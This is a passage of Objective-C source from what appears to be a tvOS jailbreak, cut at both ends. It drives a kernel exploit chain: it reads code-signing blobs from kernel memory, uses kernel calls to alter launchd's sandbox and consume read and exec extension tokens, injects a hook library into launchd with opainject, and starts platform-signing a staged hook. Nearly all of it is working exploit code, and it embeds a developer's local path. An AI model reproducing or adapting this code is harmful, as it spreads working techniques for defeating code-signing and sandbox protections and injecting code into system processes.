    dt698_stage("CURRENT_HOOK_SHA256");
    dt698_stage("CURRENT_HOOK_CDHASH");

    NSString *freezeHook = @"/Users/dxcool223/Desktop/untitled folder 4/BUILD102687_FULL_SOURCE_FREEZE/source/dopamin-tvOS-kfd/.theos/obj/handoff681/Handoff516/launchdhook516.dylib";
    if ([[NSFileManager defaultManager] fileExistsAtPath:freezeHook]) {
        NSString *fsha = dt698_sha256_file_hex(freezeHook.UTF8String);
        cdhash_t fcd = {0};
        NSString *fcdHex = @"UNAVAILABLE";
        if (dt_macho_best_cdhash_from_path(freezeHook.UTF8String, fcd) == 0)
            fcdHex = dt_cdhash_hex_string(fcd);
        dt1025_log(log, @"[*] BUILD687_HOOK_SHA256=%@", fsha);
        dt1025_log(log, @"[*] BUILD687_HOOK_CDHASH=%@", fcdHex);
        dt1025_log(log, @"[*] CURRENT_VS_687_BINARY_MATCH=%@",
            [hookSha isEqualToString:fsha] ? @"YES" : @"NO");
        dt1025_log(log, @"[*] CURRENT_VS_687_CDHASH_MATCH=%@",
            [hookCdHex isEqualToString:fcdHex] ? @"YES" : @"NO");
    } else {
        dt1025_log(log, @"[*] BUILD687_HOOK_SHA256=UNAVAILABLE");
        dt1025_log(log, @"[*] CURRENT_VS_687_BINARY_MATCH=UNAVAILABLE");
        dt1025_log(log, @"[*] CURRENT_VS_687_CDHASH_MATCH=UNAVAILABLE");
    }

    /* L2 — vnode/blob resolve (697 route) */
    dt696_blob_chain_t warm_blob = {0};
    dt696_blob_chain_t pre_launchd = {0};
    int target_fd = open(dt102710_hook_path_cstr(), O_RDONLY | O_CLOEXEC);
    if (target_fd < 0) {
        dt1025_log(log, @"[!] build698 open target errno=%d", errno);
        dt1025_set_verdict(verdictOut, @"KCALL698_TARGET_OPEN_FAIL");
        return -5;
    }

    uint64_t vnode_kva = 0;
    if (dt697_resolve_vnode_from_fd(target_fd, &vnode_kva, log) != 0) {
        close(target_fd);
        dt1025_set_verdict(verdictOut, @"KCALL698_VNODE_RESOLVE_FAIL");
        return -6;
    }
    dt696_emit_kv(log, "KCALL698_TARGET_VNODE", vnode_kva);
    dt698_stage("KCALL698_TARGET_VNODE");
    dt1025_log(log, @"[*] KCALL698_TARGET_FD=%d", target_fd);
    dt698_stage("KCALL698_TARGET_FD");

    int br = dt696_read_blob_chain(vnode_kva, &warm_blob, log);
    if (br != 0) {
        dt698_stage("KCALL698_BLOB_PREWARM_STATE=NULL");
        blobWarmup = @"FAIL";
        (void)dt698_local_sandbox_warmup(dt102710_hook_path_cstr(), log);
        br = dt696_read_blob_chain(vnode_kva, &warm_blob, log);
        if (br != 0) {
            close(target_fd);
            dt698_stage("KCALL698_BLOB_POSTWARM=FAIL");
            dt1025_set_verdict(verdictOut, @"KCALL698_BLOB_WARMUP_FAIL");
            return -7;
        }
        blobWarmup = @"PASS";
        dt698_stage("KCALL698_BLOB_PREWARM_STATE=PRESENT");
    } else {
        dt698_stage("KCALL698_BLOB_PREWARM_STATE=PRESENT");
        blobWarmup = @"NOT_NEEDED";
    }

    dt698_emit_blob_markers(log, &warm_blob, "KCALL698_TARGET");
    dt698_emit_blob_markers(log, &warm_blob, "KCALL698_BLOB_POSTWARM");
    dt698_stage("KCALL698_PLATFORM_POSTWARM");

    if (preserve_signed_hook) {
        cdhash_t precondCd = {0};
        NSString *precondCdHex = @"UNAVAILABLE";
        if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), precondCd) == 0)
            precondCdHex = dt_cdhash_hex_string(precondCd);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_PRECONDITION_VNODE=0x%llx",
            (unsigned long long)vnode_kva] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_PRECONDITION_CSBLOB=0x%llx",
            (unsigned long long)warm_blob.cs_blob] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_PRECONDITION_CSBLOB_CDHASH=%@",
            precondCdHex] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_PRECONDITION_PLATFORM_BYTE=0x%02x",
            (unsigned)warm_blob.platform] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_PRECONDITION_PLATFORM_BIT0=%u",
            (unsigned)((warm_blob.platform & 1u) != 0)] UTF8String]);
    }

    if ((warm_blob.platform & 1u) == 0) {
        close(target_fd);
        dt698_stage("KCALL698_PLATFORM_PRECONDITION_FAIL");
        dt1025_set_verdict(verdictOut, @"KCALL698_PLATFORM_PRECONDITION_FAIL");
        return -8;
    }

    uint64_t postwarm_blob = warm_blob.cs_blob;
    (void)postwarm_blob;

    /* Boomerang + stash (681 proven order: before Wall 2 apply) */
    dt681_boomerang_info_t boomerang = {0};
    if (dt681_boomerang_start(&boomerang, log) != 0) {
        close(target_fd);
        dt1025_set_verdict(verdictOut, @"KCALL698_BOOMERANG_START_FAIL");
        return -9;
    }
    dt698_stage("BUILD102710_BOOMERANG_SERVER_READY");

    NSString *stashVerdict = nil;
    if (dt681_kcall_stash_boomerang_port(boomerang.serverPort, log, &stashVerdict) != 0) {
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, stashVerdict ?: @"KCALL698_STASH_FAIL");
        return -10;
    }
    dt698_stage("BUILD102710_JBCTL_STASH_PASS");
    dt698_stage("BUILD102710_REGISTERED_PORT_SLOT2_READY");

    /* L5–L7 — frozen 694 Wall 2 apply + consume (no restore yet) */
    if (dt1025_kcall_init(log) != 0) {
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL698_KCALL_INIT_FAIL");
        return -11;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    NSString *calFail = nil;
    if (!app_proc || dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL698_CALIBRATION_FAIL");
        return -12;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = 0;
    uint64_t launchd_proc_hold = 0;

    launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, @"KCALL698_LAUNCHD_PROC_FAIL");
        return -13;
    }
    launchd_proc_hold = launchd_proc;

    BOOL pointer_cal_ok = NO;
    NSString *ptrCalFail = nil;
    if (dt692_pointer_return_calibration(launchd_proc, log, &pointer_cal_ok, &ptrCalFail) != 0
        || !pointer_cal_ok) {
        proc_rele(launchd_proc);
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, ptrCalFail ?: @"KCALL698_POINTER_CAL_FAIL");
        return -14;
    }

    dt691_ro_zone_globals_t ro = {0};
    dt694_wall2_state_t baseline = {0};
    dt694_wall2_state_t post_apply = {0};
    dt694_wall2_state_t post_consume = {0};
    BOOL wall2_active = NO;

    if (dt691_load_ro_zone_globals(&ro, log) != 0) {
        proc_rele(launchd_proc);
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, @"KCALL698_RO_ZONE_GLOBALS_FAIL");
        return -15;
    }

    dt698_stage("KCALL698_WALL2_BASELINE_BEGIN");
    dt708_stage("KCALL708_WALL2_BASELINE_CAPTURED");
    if (dt694_capture_state(launchd_proc, &ro, &baseline, log) != 0
        || !dt694_baseline_coherent(&baseline, log)) {
        proc_rele(launchd_proc);
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_BASELINE_FAIL");
        return -16;
    }
    dt698_stage("KCALL698_WALL2_BASELINE_READY");

    dt698_stage("KCALL698_WALL2_APPLY_BEGIN");
    dt708_stage("KCALL708_WALL2_APPLY_BEGIN");
    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    int apply_kern_ret = -1;
    if (dt1025_kcall_53d540(launchd_proc, &bundle, log, &apply_kern_ret) != 0 || apply_kern_ret != 0) {
        proc_rele(launchd_proc_hold);
        launchd_proc_hold = 0;
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt698_stage("KCALL698_WALL2_APPLY_RESULT=FAIL");
        wall2Apply = @"FAIL";
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_APPLY_FAIL");
        goto emit_summary;
    }
    if (dt694_capture_state(launchd_proc, &ro, &post_apply, log) != 0
        || !dt694_post_apply_valid(&baseline, &post_apply, log)) {
        proc_rele(launchd_proc_hold);
        launchd_proc_hold = 0;
        dt681_boomerang_cleanup(&boomerang);
        close(target_fd);
        dt698_stage("KCALL698_WALL2_APPLY_RESULT=FAIL");
        wall2Apply = @"FAIL";
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_APPLY_PROFILE_FAIL");
        goto emit_summary;
    }
    dt698_stage("KCALL698_WALL2_APPLY_RESULT=PASS");
    dt708_stage("KCALL708_WALL2_APPLY_RESULT=PASS");
    dt698_stage("BUILD102710_WALL2_APPLY_PASS");
    wall2Apply = @"PASS";
    wall2_active = YES;
    clock_gettime(CLOCK_MONOTONIC, &wall2_active_enter);
    dt708_stage("KCALL708_WALL2_ACTIVE_ENTER");

    char *read_token = dt1025_issue_token_path(kDTClassRead, dt102710_hook_path_cstr(), log);
    char *exec_token = dt1025_issue_token_path(kDTClassExec, dt102710_hook_path_cstr(), log);
    if (!read_token || !exec_token) {
        if (read_token)
            sandbox_extension_release(read_token);
        if (exec_token)
            sandbox_extension_release(exec_token);
        dt1025_set_verdict(verdictOut, @"KCALL698_EXTENSION_ISSUE_FAIL");
        goto wall2_cleanup;
    }

    dt698_stage("KCALL698_WALL2_READ_CONSUME_BEGIN");
    int read_kern_ret = -1;
    int64_t read_handle = dt1025_kcall_consume_token(launchd_proc, read_token, log, &read_kern_ret);
    if (read_kern_ret != 0 || read_handle == 0) {
        sandbox_extension_release(read_token);
        sandbox_extension_release(exec_token);
        dt698_stage("KCALL698_WALL2_READ_CONSUME_RESULT=FAIL");
        dt708_stage("KCALL708_WALL2_READ_CONSUME_RESULT=FAIL");
        wall2Read = @"FAIL";
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_READ_CONSUME_FAIL");
        goto wall2_cleanup;
    }
    dt698_stage("KCALL698_WALL2_READ_CONSUME_RESULT=PASS");
    dt708_stage("KCALL708_WALL2_READ_CONSUME_RESULT=PASS");
    dt698_stage("BUILD102710_READ_CONSUME_PASS");
    wall2Read = @"PASS";

    dt698_stage("KCALL698_WALL2_EXEC_CONSUME_BEGIN");
    int exec_kern_ret = -1;
    int64_t exec_handle = dt1025_kcall_consume_token(launchd_proc, exec_token, log, &exec_kern_ret);
    sandbox_extension_release(read_token);
    sandbox_extension_release(exec_token);
    if (exec_kern_ret != 0 || exec_handle == 0) {
        dt698_stage("KCALL698_WALL2_EXEC_CONSUME_RESULT=FAIL");
        dt708_stage("KCALL708_WALL2_EXEC_CONSUME_RESULT=FAIL");
        wall2Exec = @"FAIL";
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_EXEC_CONSUME_FAIL");
        goto wall2_cleanup;
    }
    dt698_stage("KCALL698_WALL2_EXEC_CONSUME_RESULT=PASS");
    dt708_stage("KCALL708_WALL2_EXEC_CONSUME_RESULT=PASS");
    dt698_stage("BUILD102710_EXEC_CONSUME_PASS");
    wall2Exec = @"PASS";

    if (dt694_capture_state(launchd_proc, &ro, &post_consume, log) != 0
        || post_consume.profile_532c68 == 0
        || post_consume.profile_532c68 != post_consume.slot_cfg) {
        dt1025_set_verdict(verdictOut, @"KCALL698_WALL2_POST_CONSUME_INCOHERENT");
        goto wall2_cleanup;
    }
    dt698_stage("KCALL698_WALL2_ACTIVE_READY");

    /* L8 — pre-launchd blob identity */
    if (dt696_read_blob_chain(vnode_kva, &pre_launchd, log) != 0
        || (pre_launchd.platform & 1u) == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL698_PRELAUNCHD_BLOB_FAIL");
        goto wall2_cleanup;
    }
    dt698_emit_blob_markers(log, &pre_launchd, "KCALL698_PRELAUNCHD");
    prelaunchdBlob = @"PASS";
    prelaunchdBit = @"1";
    prelaunchdIdentity = dt698_classify_identity(postwarm_blob, pre_launchd.cs_blob);
    dt1025_log(log, @"[*] KCALL698_BLOB_IDENTITY_BEFORE_LAUNCHD=%@", prelaunchdIdentity);
    dt698_stage([[NSString stringWithFormat:@"KCALL698_BLOB_IDENTITY_BEFORE_LAUNCHD=%@",
        prelaunchdIdentity] UTF8String]);

    if ([prelaunchdIdentity isEqualToString:@"DIFFERENT"] && (pre_launchd.platform & 1u) == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL698_PRELAUNCHD_BLOB_BIT0_FAIL");
        goto wall2_cleanup;
    }

    /* L9 — bounded opainject trigger (synchronous spawn); restore before boomerang wait */
    dt698_stage("KCALL698_LAUNCHD_ATTEMPT_BEGIN");
    dt698_stage("KCALL698_CORRELATION_WINDOW_BEGIN");
    dt708_stage("KCALL708_INJECT_BEGIN");

    dt698_stage("KCALL698_REMOTE_DLOPEN_BEGIN");
    inject_attempted = YES;
    inject_r = dt681_spawn_opainject_launchd(dt102710_hook_path_cstr(), log, &injectCapture);
    dt698_stage(inject_r == 0 ? "KCALL698_OPAINJECT_SPAWN_RESULT=PASS"
                              : "KCALL698_OPAINJECT_SPAWN_RESULT=FAIL");
    dt708_stage(inject_r == 0 ? "KCALL708_OPAINJECT_SPAWN_RESULT=PASS"
                              : "KCALL708_OPAINJECT_SPAWN_RESULT=FAIL");
    opainjectAttempt = (inject_r == 0) ? @"PASS" : @"FAIL";
    dt708_stage("KCALL708_OPAINJECT_TRIGGER_COMPLETE");
    dt698_stage("BUILD102710_OPAINJECT_TRIGGER_COMPLETE");

    hook_ctor_seen = NO;
    if ([injectCapture containsString:@"KCALL681_REMOTE_DLOPEN_WORKING"]) {
        hook_ctor_seen = YES;
        remoteDlopen = @"PASS";
    } else if (inject_r == 0) {
        remoteDlopen = @"UNKNOWN";
    } else {
        remoteDlopen = @"FAIL";
    }
    dt698_stage(hook_ctor_seen ? "KCALL698_HOOK_CONSTRUCTOR_SEEN=YES"
                               : "KCALL698_HOOK_CONSTRUCTOR_SEEN=NO");
    dt708_stage(hook_ctor_seen ? "KCALL708_HOOK_CONSTRUCTOR_RESULT=YES"
                               : "KCALL708_HOOK_CONSTRUCTOR_RESULT=NO");
    hookCtor = hook_ctor_seen ? @"SEEN" : @"NOT_SEEN";

    goto wall2_cleanup;

wall2_cleanup:
    if (wall2_active && !wall2_restored) {
        BOOL state_match = NO;
        int restore_r = dt709_wall2_restore_launchd(launchd_proc, &baseline, log,
            &wall2Restore, &state_match);
        wall2_restored = YES;
        wall2_restore_ok = (restore_r == 0);

        struct timespec wall2_active_exit = {0};
        clock_gettime(CLOCK_MONOTONIC, &wall2_active_exit);
        long long active_ms = (wall2_active_exit.tv_sec - wall2_active_enter.tv_sec) * 1000LL
            + (wall2_active_exit.tv_nsec - wall2_active_enter.tv_nsec) / 1000000LL;
        if (active_ms < 0)
            active_ms = 0;
        dt709_stage([[NSString stringWithFormat:@"KCALL709_WALL2_ACTIVE_DURATION_MS=%lld",
            active_ms] UTF8String]);
        dt708_stage([[NSString stringWithFormat:@"KCALL708_WALL2_ACTIVE_DURATION_MS=%lld",
            active_ms] UTF8String]);
        dt708_stage("KCALL708_WALL2_ACTIVE_EXIT");

        if (!wall2_restore_ok) {
            dt709_stage("DANGEROUS_STALE_WALL2_STATE");
            if (restore_r == -9)
                dt709_stage("KCALL709_WALL2_RESTORE_STATE_MATCH=NO");
            else
                dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
            finalClass = (restore_r == -9) ? @"KCALL709_WALL2_RESTORE_STATE_MISMATCH"
                                           : @"KCALL709_WALL2_RESTORE_FAIL";
            goto emit_summary;
        }
    }

    if (wall2_active && inject_attempted) {
        dt709_stage("KCALL709_BOOMERANG_WAIT_BEGIN");
        dt708_stage("KCALL708_BOOMERANG_WAIT_BEGIN");
        int boom_r = dt681_boomerang_wait(&boomerang, log);
        BOOL boomerang_seen = (boom_r == 0);
        dt698_stage(boomerang_seen ? "KCALL698_BOOMERANG_SEEN=YES" : "KCALL698_BOOMERANG_SEEN=NO");
        dt709_stage(boomerang_seen ? "KCALL709_BOOMERANG_WAIT_RESULT=PASS"
                                   : "KCALL709_BOOMERANG_WAIT_RESULT=TIMEOUT");
        dt708_stage(boomerang_seen ? "KCALL708_BOOMERANG_WAIT_RESULT=PASS"
                                   : "KCALL708_BOOMERANG_WAIT_RESULT=TIMEOUT");
        boomerangSeen = boomerang_seen ? @"SEEN" : @"NOT_SEEN";

        if (!hook_ctor_seen && boomerang_seen
            && [injectCapture containsString:@"KCALL681_REMOTE_DLOPEN_WORKING"]) {
            hook_ctor_seen = YES;
            remoteDlopen = @"PASS";
            hookCtor = @"SEEN";
            dt698_stage("KCALL698_HOOK_CONSTRUCTOR_SEEN=YES");
            dt708_stage("KCALL708_HOOK_CONSTRUCTOR_RESULT=YES");
        } else if (!hook_ctor_seen && boom_r == -2) {
            dt708_stage("KCALL708_HOOK_CONSTRUCTOR_RESULT=TIMEOUT");
        }

        dt698_stage([[NSString stringWithFormat:@"KCALL698_REMOTE_DLOPEN_RESULT=%@", remoteDlopen] UTF8String]);
        dt698_stage("KCALL698_CORRELATION_WINDOW_END");

        wall1Result = dt698_classify_wall1(injectCapture, inject_r, boom_r, hook_ctor_seen, boomerang_seen);
        dt1025_log(log, @"[*] KCALL698_WALL1_RESULT=%@", wall1Result);
        dt698_stage([[NSString stringWithFormat:@"KCALL698_WALL1_RESULT=%@", wall1Result] UTF8String]);
        dt708_stage([[NSString stringWithFormat:@"KCALL708_WALL1_RESULT=%@", wall1Result] UTF8String]);
    }

    dt681_boomerang_cleanup(&boomerang);

    if (wall2_active && wall2_restore_ok && inject_attempted) {
        dt709_stage("KCALL709_POST_RESTORE_SURVIVAL_BEGIN");
        dt708_stage("KCALL708_POST_RESTORE_SURVIVAL_BEGIN");
        dt698_stage("KCALL698_POST_RESTORE_SURVIVAL_BEGIN");
        sleep(kDT694SyncObserveSec);
        BOOL alive = dt698_launchd_alive();
        launchdAlive = alive ? @"YES" : @"NO";
        dt698_stage(alive ? "KCALL698_LAUNCHD_ALIVE_AFTER_RESTORE=YES"
                          : "KCALL698_LAUNCHD_ALIVE_AFTER_RESTORE=NO");
        dt709_stage(alive ? "KCALL709_LAUNCHD_ALIVE_AFTER_SYNC=YES"
                          : "KCALL709_LAUNCHD_ALIVE_AFTER_SYNC=NO");
        dt708_stage(alive ? "KCALL708_LAUNCHD_ALIVE_AFTER_SYNC=YES"
                          : "KCALL708_LAUNCHD_ALIVE_AFTER_SYNC=NO");
        dt698_stage(alive ? "KCALL698_POST_RESTORE_SURVIVAL_RESULT=PASS"
                          : "KCALL698_POST_RESTORE_SURVIVAL_RESULT=FAIL");
        dt709_stage(alive ? "KCALL709_WALL2_RESTORE_SYNC_RESULT=PASS"
                          : "KCALL709_WALL2_RESTORE_SYNC_RESULT=FAIL");
        dt708_stage(alive ? "KCALL708_WALL2_RESTORE_SYNC_RESULT=PASS"
                          : "KCALL708_WALL2_RESTORE_SYNC_RESULT=FAIL");

        if (!alive) {
            finalClass = @"KCALL709_WALL2_RESTORE_SYNC_FAIL";
            diag_rc = -90;
            goto emit_summary;
        }

        /* L14 — post-attempt blob read */
        dt696_blob_chain_t post_attempt = {0};
        if (dt696_read_blob_chain(vnode_kva, &post_attempt, log) == 0) {
            dt698_emit_blob_markers(log, &post_attempt, "KCALL698_POST_ATTEMPT");
            postBlobIdentity = dt698_classify_identity(pre_launchd.cs_blob, post_attempt.cs_blob);
        }
        dt1025_log(log, @"[*] KCALL698_POST_ATTEMPT_BLOB_IDENTITY=%@", postBlobIdentity);
        dt698_stage([[NSString stringWithFormat:@"KCALL698_POST_ATTEMPT_BLOB_IDENTITY=%@",
            postBlobIdentity] UTF8String]);

        finalClass = @"BUILD102698_DIAGNOSTIC_COMPLETE";
        diag_rc = 0;
    }

    if (launchd_proc_hold) {
        proc_rele(launchd_proc_hold);
        launchd_proc_hold = 0;
    }
    if (target_fd >= 0) {
        close(target_fd);
        target_fd = -1;
    }
    goto emit_summary;

emit_summary:
    if (launchd_proc_hold) {
        proc_rele(launchd_proc_hold);
        launchd_proc_hold = 0;
    }
    if (target_fd >= 0)
        close(target_fd);
    BOOL dt710_ctor = [injectCapture containsString:@"KCALL518_LAUNCHDHOOK_CONSTRUCTOR_ENTERED"];
    BOOL dt710_boom_ok = [injectCapture containsString:@"KCALL518_LAUNCHDHOOK_BOOMERANG_RECOVER_OK"];
    BOOL dt710_boom_blocked = [injectCapture containsString:@"KCALL518_LAUNCHDHOOK_BOOMERANG_RECOVER_BLOCKED"];
    BOOL dt710_xpc = [injectCapture containsString:@"KCALL518_LAUNCHDHOOK_XPC_HOOK_READY"];
    NSString *dt710Remote = [remoteDlopen isEqualToString:@"PASS"] ? @"SUCCESS" :
        ([remoteDlopen isEqualToString:@"FAIL"] ? @"FAIL" : @"UNKNOWN");
    NSString *dt710Boom = dt710_boom_ok ? @"OK" : (dt710_boom_blocked ? @"BLOCKED" :
        ([boomerangSeen isEqualToString:@"SEEN"] ? @"OK" : @"UNKNOWN"));
    NSString *dt710DlopenError = [dt710Remote isEqualToString:@"SUCCESS"] ? @"N/A" :
        (injectCapture.length ? injectCapture : @"UNAVAILABLE");
    dt710DlopenError = [[dt710DlopenError componentsSeparatedByCharactersInSet:
        [NSCharacterSet newlineCharacterSet]] componentsJoinedByString:@" | "];
    if (dt710DlopenError.length > 240)
        dt710DlopenError = [[dt710DlopenError substringToIndex:240] stringByAppendingString:@"..."];
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_REMOTE_DLOPEN=%@", dt710Remote] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_REMOTE_DLOPEN_ERROR=%@", dt710DlopenError] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_CONSTRUCTOR_ENTERED=%@",
        dt710_ctor ? @"YES" : @"NO"] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_BOOMERANG_RECOVER=%@", dt710Boom] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_XPC_HOOK_READY=%@",
        dt710_xpc ? @"YES" : @"NO"] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_WALL2_RESTORE=%@", wall2Restore] UTF8String]);
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_LAUNCHD_ALIVE_AFTER_31S=%@", launchdAlive] UTF8String]);
    dt698_stage(access("/private/var/jb/.dt518_launchdhook_ctor_entered", F_OK) == 0
        ? "BUILD102710_MARKER_FILE_CTOR=YES" : "BUILD102710_MARKER_FILE_CTOR=NO");
    dt698_stage(access("/private/var/jb/.dt518_boomerang_recover_ok", F_OK) == 0
        ? "BUILD102710_MARKER_FILE_BOOMERANG_OK=YES" : "BUILD102710_MARKER_FILE_BOOMERANG_OK=NO");
    dt698_stage(access("/private/var/jb/.dt518_xpc_hook_ready", F_OK) == 0
        ? "BUILD102710_MARKER_FILE_XPC_READY=YES" : "BUILD102710_MARKER_FILE_XPC_READY=NO");
    dt1025_log(log, @"[*] BLOB_WARMUP=%@", blobWarmup);
    dt1025_log(log, @"[*] PRELAUNCHD_BLOB_RESOLUTION=%@", prelaunchdBlob);
    dt1025_log(log, @"[*] PRELAUNCHD_PLATFORM_BIT=%@", prelaunchdBit);
    dt1025_log(log, @"[*] PRELAUNCHD_BLOB_IDENTITY=%@", prelaunchdIdentity);
    dt1025_log(log, @"[*] WALL2_APPLY=%@", wall2Apply);
    dt1025_log(log, @"[*] WALL2_READ_CONSUME=%@", wall2Read);
    dt1025_log(log, @"[*] WALL2_EXEC_CONSUME=%@", wall2Exec);
    dt1025_log(log, @"[*] LAUNCHD_OPAINJECT_ATTEMPT=%@", opainjectAttempt);
    dt1025_log(log, @"[*] REMOTE_DLOPEN=%@", remoteDlopen);
    dt1025_log(log, @"[*] HOOK_CONSTRUCTOR=%@", hookCtor);
    dt1025_log(log, @"[*] BOOMERANG=%@", boomerangSeen);
    dt1025_log(log, @"[*] WALL1_RESULT=%@", wall1Result);
    dt1025_log(log, @"[*] WALL2_RESTORE=%@", wall2Restore);
    dt1025_log(log, @"[*] POST_RESTORE_LAUNCHD_ALIVE=%@", launchdAlive);
    dt1025_log(log, @"[*] POST_ATTEMPT_BLOB_IDENTITY=%@", postBlobIdentity);

    if (verdictOut)
        *verdictOut = finalClass;

    if (diag_rc == 0)
        return 0;
    if (diag_rc < 0)
        return diag_rc;
    return [finalClass isEqualToString:@"BUILD102698_DIAGNOSTIC_COMPLETE"] ? 0 : -1;
}

int dt698_run_launchd_wall1_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    return dt698_run_launchd_wall1_diagnostic_ex(log, verdictOut, NO);
}

/* =============================================================================
 * BUILD102699 — Native platform-signing + artifact identity closure
 * Phase A: deterministic hook identity + cs_blob+0xAC bit0 via kernel attach
 * Phase B: frozen 698 launchd Wall1 correlation (only if Phase A passes)
 * ============================================================================= */

static void dt699_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static NSString *dt699_sha256_path(NSString *path)
{
    if (!path.length)
        return @"";
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data.length)
        return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (size_t i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
        [hex appendFormat:@"%02x", digest[i]];
    return hex;
}

static NSString *dt699_cdhash_path(NSString *path)
{
    cdhash_t cd = {0};
    if (!path.length || dt_macho_best_cdhash_from_path(path.fileSystemRepresentation, cd) != 0)
        return @"UNAVAILABLE";
    return dt_cdhash_hex_string(cd);
}

static NSString *dt699_read_manifest_value(NSString *key)
{
    NSString *manifest = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516/hook_build_manifest.txt"];
    NSString *text = [NSString stringWithContentsOfFile:manifest encoding:NSUTF8StringEncoding error:nil];
    if (!text.length)
        return @"UNAVAILABLE";
    NSString *prefix = [key stringByAppendingString:@"="];
    for (NSString *line in [text componentsSeparatedByString:@"\n"]) {
        if ([line hasPrefix:prefix])
            return [line substringFromIndex:prefix.length];
    }
    return @"UNAVAILABLE";
}

static int dt699_local_sandbox_warmup(const char *path, void (^log)(NSString *line))
{
    (void)path;
    (void)log;
    dt699_stage("KCALL699_LOCAL_SANDBOX_WARMUP_BEGIN");
    dt699_stage("BUILD102723_MAIN_PROCESS_DLOPEN=SKIPPED");
    dt699_stage("KCALL699_LOCAL_SANDBOX_WARMUP_RESULT=ISOLATED_PROBE_ONLY");
    return 0;
}

static void dt699_emit_blob_markers(void (^log)(NSString *line), const dt696_blob_chain_t *c,
    const char *prefix)
{
    if (!c || !c->valid)
        return;
    char buf[96];
    snprintf(buf, sizeof(buf), "%s_VNODE", prefix);
    dt696_emit_kv(log, buf, c->vnode);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_UBC", prefix);
    dt696_emit_kv(log, buf, c->ubc_info);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_CSBLOB", prefix);
    dt696_emit_kv(log, buf, c->cs_blob);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_PLATFORM_BYTE", prefix);
    dt1025_log(log, @"[*] %s_PLATFORM_BYTE=0x%02x", prefix, (unsigned)c->platform);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_PLATFORM_BIT0", prefix);
    dt1025_log(log, @"[*] %s_PLATFORM_BIT0=%u", prefix, (unsigned)(c->platform & 1u));
    dt699_stage(buf);
}

static uint8_t dt699_macho_codedirectory_platform_byte(NSString *path)
{
    if (!path.length)
        return 0;
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data.length)
        return 0;
    const uint8_t *bytes = data.bytes;
    NSUInteger len = data.length;
    const uint8_t magic[4] = { 0xfa, 0xde, 0x0c, 0x02 };
    for (NSUInteger i = 0; i + 32 < len; i++) {
        if (memcmp(bytes + i, magic, 4) != 0)
            continue;
        uint32_t ver = (uint32_t)(bytes[i + 8] << 24 | bytes[i + 9] << 16 | bytes[i + 10] << 8 | bytes[i + 11]);
        if (ver >= 0x20100)
            return bytes[i + 28];
    }
    return 0;
}

static void dt704_emit_layout(const char *prefix, const dt_choma_macho_layout_info_t *info)
{
    if (!info)
        return;
    char buf[128];
    snprintf(buf, sizeof(buf), "%s_FILE_SIZE=%llu", prefix, (unsigned long long)info->file_size);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_CS_DATAOFF=%u", prefix, info->cs_dataoff);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_CS_DATASIZE=%u", prefix, info->cs_datasize);
    dt699_stage(buf);
    snprintf(buf, sizeof(buf), "%s_CS_END=%llu", prefix, (unsigned long long)info->cs_end);
    dt699_stage(buf);
}

static int dt704_choma_platform_sign_staged_hook(void (^log)(NSString *line))
{
